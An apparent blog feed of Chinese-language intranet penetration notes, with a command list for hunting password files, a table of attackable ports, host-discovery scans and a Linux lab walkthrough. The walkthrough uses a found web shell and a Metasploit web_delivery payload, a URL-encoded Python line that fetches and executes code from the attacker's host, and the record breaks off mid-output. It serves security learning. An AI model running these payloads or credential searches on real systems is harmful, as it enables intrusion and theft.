&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144622209.png&#34; alt=&#34;image-20240304144622209&#34;&gt;&lt;/p&gt;
&lt;p&gt;识别杀软&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144943521.png&#34; alt=&#34;image-20240304144943521&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询当前工作环境&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304145111793.png&#34; alt=&#34;image-20240304145111793&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;敏感文件密码收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#敏感文件密码收集&#34;&gt;#&lt;/a&gt; 敏感文件密码收集&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;#指定目录下搜集各类敏感文件
dir /a /s /b d:\&amp;quot;*.txt&amp;quot;
dir /a /s /b d:\&amp;quot;*.xml&amp;quot;
dir /a /s /b d:\&amp;quot;*.mdb&amp;quot;
dir /a /s /b d:\&amp;quot;*.sql&amp;quot;
dir /a /s /b d:\&amp;quot;*.mdf&amp;quot;
dir /a /s /b d:\&amp;quot;*.eml&amp;quot;
dir /a /s /b d:\&amp;quot;*.pst&amp;quot;
dir /a /s /b d:\&amp;quot;*conf*&amp;quot;
dir /a /s /b d:\&amp;quot;*bak*&amp;quot;
dir /a /s /b d:\&amp;quot;*pwd*&amp;quot;
dir /a /s /b d:\&amp;quot;*pass*&amp;quot;
dir /a /s /b d:\&amp;quot;*login*&amp;quot;
dir /a /s /b d:\&amp;quot;*user*&amp;quot;
findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak


find /etc/ -name passwd -exec grep &amp;quot;root&amp;quot; &amp;#123;&amp;#125; \; &amp;gt; /tmp/test.txt
find /etc/ -name passwd -exec grep -H &amp;quot;root&amp;quot; &amp;#123;&amp;#125; \;
/etc/passwd:root:x:0:0:root:/root:/bin/bash
/etc/passwd:operator:x:11:0:operator:/root:/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;易受攻击的常见端口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#易受攻击的常见端口&#34;&gt;#&lt;/a&gt; 易受攻击的常见端口&lt;/h3&gt;
&lt;p&gt;80 / 8080     &lt;strong&gt;HTTP&lt;/strong&gt;         　　　　　　　　　　　　　　　　　　　　　Web 攻击 \ 爆破 \ 对应服务器版本漏洞&lt;/p&gt;
&lt;p&gt;443            &lt;strong&gt;HTTPS&lt;/strong&gt;                                                同上&lt;/p&gt;
&lt;p&gt;7001/7002      &lt;strong&gt;WebLogic 控制台&lt;/strong&gt;　　　　　　　　　　　　　　　　　　　　　　java 反序列化 \ 弱口令&lt;/p&gt;
&lt;p&gt;8080 /8089     &lt;strong&gt;Jboss/Resin/Jetty/Jenkins&lt;/strong&gt;    　　　　　　　　　　　　　　　反序列化 \ 控制台弱口令&lt;/p&gt;
&lt;p&gt;9090          &lt;strong&gt;WebSphere 控制台&lt;/strong&gt;       　　　　　　　　　　　　　　　　　java 反序列化 \ 弱口令&lt;/p&gt;
&lt;p&gt;4848          &lt;strong&gt;GlassFish&lt;/strong&gt; 控制台       　　　　　　　　　　　　　　　　　弱口令&lt;/p&gt;
&lt;p&gt;1352          &lt;strong&gt;Lotus domino&lt;/strong&gt; 邮件服务                                  弱口令 \ 信息泄露 \ 爆破&lt;/p&gt;
&lt;p&gt;10000         &lt;strong&gt;Webmin-Web&lt;/strong&gt; 控制面板                                  弱口令&lt;/p&gt;
&lt;p&gt;3306         &lt;strong&gt;MySQL&lt;/strong&gt;　　                                           注入 \ 提权 \ 爆破&lt;/p&gt;
&lt;p&gt;1433         &lt;strong&gt;SQLserver&lt;/strong&gt;                                           注入 \ 提权 \SA 弱口令 \ 爆破&lt;/p&gt;
&lt;p&gt;1521          &lt;strong&gt;Oracle&lt;/strong&gt; 数据库                                         TNS 爆破 \ 注入 \ 反弹 Shell&lt;/p&gt;
&lt;p&gt;5432          PostgreSQL 数据库                                    爆破 \ 注入 \ 弱口令&lt;/p&gt;
&lt;p&gt;27017 / 27018  MongoDB                                            爆破 \ 未授权访问&lt;/p&gt;
&lt;p&gt;6379           Redis 数据库                                          可尝试未授权访问 \ 弱口令爆破&lt;/p&gt;
&lt;p&gt;5000          SysBase/DB2 数据库                                   爆破 \ 注入&lt;/p&gt;
&lt;p&gt;25          &lt;strong&gt;SMTP&lt;/strong&gt; 邮件服务                                   邮件伪造&lt;/p&gt;
&lt;p&gt;110         &lt;strong&gt;POP3&lt;/strong&gt; 协议                                       爆破 \ 嗅探&lt;/p&gt;
&lt;p&gt;143         &lt;strong&gt;IMAP&lt;/strong&gt; 协议                                       爆破&lt;/p&gt;
&lt;p&gt;53         &lt;strong&gt;DNS&lt;/strong&gt; 域名系统                                   允许区域传送 \DNS 劫持 \ 缓存投毒 \ 欺骗&lt;/p&gt;
&lt;p&gt;67 / 68      &lt;strong&gt;DHCP&lt;/strong&gt; 服务                                      劫持 \ 欺骗&lt;/p&gt;
&lt;p&gt;161        &lt;strong&gt;SNMP&lt;/strong&gt; 协议                                      爆破 \ 搜集目标内网信息&lt;/p&gt;
&lt;p&gt;2181        &lt;strong&gt;Zookeeper&lt;/strong&gt; 服务                                   未授权访问&lt;/p&gt;
&lt;p&gt;8069         &lt;strong&gt;Zabbix&lt;/strong&gt; 服务                                      远程执行 \ SQL 注入&lt;/p&gt;
&lt;p&gt;9200 /9300   &lt;strong&gt;Elasticsearch&lt;/strong&gt; 服务                                远程执行&lt;/p&gt;
&lt;p&gt;11211        &lt;strong&gt;Memcache&lt;/strong&gt; 服务                                 未授权访问&lt;/p&gt;
&lt;p&gt;512 / 513 /514  &lt;strong&gt;Linux Rexec&lt;/strong&gt; 服务                                爆破 \ Rlogin 登陆&lt;/p&gt;
&lt;p&gt;873          &lt;strong&gt;Rsync&lt;/strong&gt; 服务                                      匿名访问 \ 文件上传&lt;/p&gt;
&lt;p&gt;3690        &lt;strong&gt;Svn&lt;/strong&gt; 服务                                        Svn 泄露 \ 未授权访问&lt;/p&gt;
&lt;p&gt;50000         &lt;strong&gt;SAP Management Console&lt;/strong&gt;                                远程执行&lt;/p&gt;
&lt;h3 id=&#34;存活主机探测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存活主机探测&#34;&gt;#&lt;/a&gt; 存活主机探测&lt;/h3&gt;
&lt;h4 id=&#34;icmp协议探测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#icmp协议探测&#34;&gt;#&lt;/a&gt; icmp 协议探测&lt;/h4&gt;
&lt;p&gt;win&lt;/p&gt;
&lt;p&gt;&lt;code&gt;for /L %I in (1,1,254) Do @ping -w 1 -n 1 10.10.10.%I | findstr &amp;quot;TTL&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;linux&lt;/p&gt;
&lt;p&gt;&lt;code&gt;for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &amp;quot;ttl&amp;quot;|awk -F &amp;quot;[ :]+&amp;quot; &#39;&amp;#123;print $4&amp;#125;&#39;; done&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但是速度太慢&lt;/p&gt;
&lt;h4 id=&#34;invoke-tspingsweepps1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#invoke-tspingsweepps1&#34;&gt;#&lt;/a&gt; Invoke-TSPingSweep.ps1&lt;/h4&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;powershell.exe -exec bypass -Command &#34;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304194141615.png&#34; alt=&#34;image-20240304194141615&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;arp-scan&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#arp-scan&#34;&gt;#&lt;/a&gt; ARP-scan&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;arp-scan -t 10.10.10.0/24&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304194058816.png&#34; alt=&#34;image-20240304194058816&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;nbtscan&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nbtscan&#34;&gt;#&lt;/a&gt; nbtscan&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy51bml4d2l6Lm5ldC90b29scy9uYnRzY2FuLmh0bWw=&#34;&gt;http://www.unixwiz.net/tools/nbtscan.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nbtscan 10.10.10.0/24&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304221708922.png&#34; alt=&#34;image-20240304221708922&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;tcping&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tcping&#34;&gt;#&lt;/a&gt; tcping&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbGlmdWxrZXJzb24uY29tL3Byb2plY3RzL3RjcGluZy5waHA=&#34;&gt;https://elifulkerson.com/projects/tcping.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;tcping -n ip 端口&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304222152734.png&#34; alt=&#34;image-20240304222152734&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;fscan&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fscan&#34;&gt;#&lt;/a&gt; fscan&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvdzFuZy9mc2Nhbg==&#34;&gt;https://github.com/shadow1ng/fscan&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;fscan.exe -h 10.10.10.1-255 -p 22,445&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304222456424.png&#34; alt=&#34;image-20240304222456424&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2024/03/03/network-security/neiwang/NTLMRelay/</guid>
            <title>NTLMRelay</title>
            <link>http://gyzero.shop/2024/03/03/network-security/neiwang/NTLMRelay/</link>
            <pubDate>Sun, 03 Mar 2024 17:22:07 +0800</pubDate>
            <description><![CDATA[  ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/</guid>
            <title>linux提权</title>
            <link>http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/</link>
            <pubDate>Fri, 10 Nov 2023 17:52:23 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;信息收集命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集命令&#34;&gt;#&lt;/a&gt; 信息收集命令&lt;/h3&gt;
&lt;h4 id=&#34;系统信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统信息&#34;&gt;#&lt;/a&gt; 系统信息&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;uname -a&lt;/code&gt; &lt;/strong&gt;: 显示内核、操作系统和 CPU 信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;head -n 1 /etc/issue&lt;/code&gt; &lt;/strong&gt;: 显示操作系统版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;cat /proc/version&lt;/code&gt; &lt;/strong&gt;: 显示系统信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;hostname&lt;/code&gt; &lt;/strong&gt;: 显示计算机名。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;env&lt;/code&gt; &lt;/strong&gt;: 显示环境变量。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;网络信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网络信息&#34;&gt;#&lt;/a&gt; 网络信息&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;ifconfig&lt;/code&gt; &lt;/strong&gt;: 显示网络接口信息（现在更常用的是 &lt;code&gt;ip addr show&lt;/code&gt; ）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;netstat -lntp&lt;/code&gt; &lt;/strong&gt;: 显示所有监听端口。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;netstat -antp&lt;/code&gt; &lt;/strong&gt;: 显示所有已建立的连接。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;netstat -s&lt;/code&gt; &lt;/strong&gt;: 显示网络统计信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;iptables -L&lt;/code&gt; &lt;/strong&gt;: 显示防火墙设置。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;route -n&lt;/code&gt; &lt;/strong&gt;: 显示路由表。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;用户组信息系统服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户组信息系统服务&#34;&gt;#&lt;/a&gt; 用户组信息系统服务&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;w&lt;/code&gt; &lt;/strong&gt;：显示活动用户和他们正在使用的终端等信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;id [username]&lt;/code&gt; &lt;/strong&gt;：显示指定用户的信息，包括用户 ID（UID）、所属用户组等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;last&lt;/code&gt; &lt;/strong&gt;：显示用户登录的历史记录，包括登录时间和来源。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;cut -d: -f1 /etc/passwd&lt;/code&gt; &lt;/strong&gt;：显示系统上所有用户的用户名。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;cut -d: -f1 /etc/group&lt;/code&gt; &lt;/strong&gt;：显示系统上所有组的组名。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;crontab -l&lt;/code&gt; &lt;/strong&gt;：显示当前用户的计划任务（定时任务）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;chkconfig --list&lt;/code&gt; &lt;/strong&gt;：列出所有系统服务。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;chkconfig --list | grep on&lt;/code&gt; &lt;/strong&gt;：列出所有已启动的系统服务。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;echo $PATH&lt;/code&gt; &lt;/strong&gt;：显示系统的路径列表，用冒号分隔的目录列表表示系统在搜索可执行文件时的顺序。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;nmap -sT 192.168.244.0/24&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190515553.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;访问 80 没啥东西扫一下目录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190852090.png&#34; alt=&#34;image-20231121190852090&#34;&gt;&lt;/p&gt;
&lt;p&gt;扫到一个 shell.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191144694.png&#34; alt=&#34;image-20231121191144694&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; 反弹 shell&lt;/h4&gt;
&lt;p&gt;参数是 cmd 可以执行命令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191211218.png&#34; alt=&#34;image-20231121191211218&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191300474.png&#34; alt=&#34;image-20231121191300474&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msf script/web_delivery模块 反弹shell&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;use exploit/multi/script/web_delivery &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set lhost 192.168.244.128&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set lport 9000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;run&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191557311.png&#34; alt=&#34;image-20231121191557311&#34;&gt;&lt;/p&gt;
&lt;p&gt;复制 payload 并且 url 编码添加在 cmd 参数后面执行得到 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python%20-c%20%22import%20sys%3Bimport%20ssl%3Bu%3D__import__(&#39;urllib&#39;%2B%7B2%3A&#39;&#39;%2C3%3A&#39;.request&#39;%7D%5Bsys.version_info%5B0%5D%5D%2Cfromlist%3D(&#39;urlopen&#39;%2C))%3Br%3Du.urlopen(&#39;http%3A%2F%2F192.168.244.128%3A8080%2FsZTvRL2bM&#39;%2C%20context%3Dssl._create_unverified_context())%3Bexec(r.read())%3B%22&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191810361.png&#34; alt=&#34;image-20231121191810361&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;主机信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#主机信息收集&#34;&gt;#&lt;/a&gt; 主机信息收集&lt;/h4&gt;
&lt;p&gt;先拿一个交互 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;**python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;**&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121192112964.png&#34; alt=&#34;image-20231121192112964&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;显示内核、操作系统和CPU信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux osboxes &lt;span class=&#34;token number&#34;&gt;4.15&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;generic &lt;span class=&#34;token comment&#34;&gt;#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;操作系统版本&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux Lite &lt;span class=&#34;token number&#34;&gt;4.4&lt;/span&gt; LTS \n \l&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;显示系统信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux version &lt;span class=&#34;token number&#34;&gt;4.15&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;generic &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buildd@lgw01&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;amd64&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;031&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gcc version &lt;span class=&#34;token number&#34;&gt;7.3&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Ubuntu &lt;span class=&#34;token number&#34;&gt;7.3&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;16ubuntu3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;环境变量&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;env&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_LOG_DIR&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;log&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LANG&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;C&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;INVOCATION_ID&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;15ecc432bc2940368927675d4ac3a3a3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_LOCK_DIR&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;lock&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PWD&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;www&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;html&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;JOURNAL_STREAM&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21980&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_RUN_GROUP&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;user6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_RUN_DIR&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;run&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_RUN_USER&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;user6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_PID_FILE&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;run&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SHLVL&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PATH&lt;span class=&#34;token 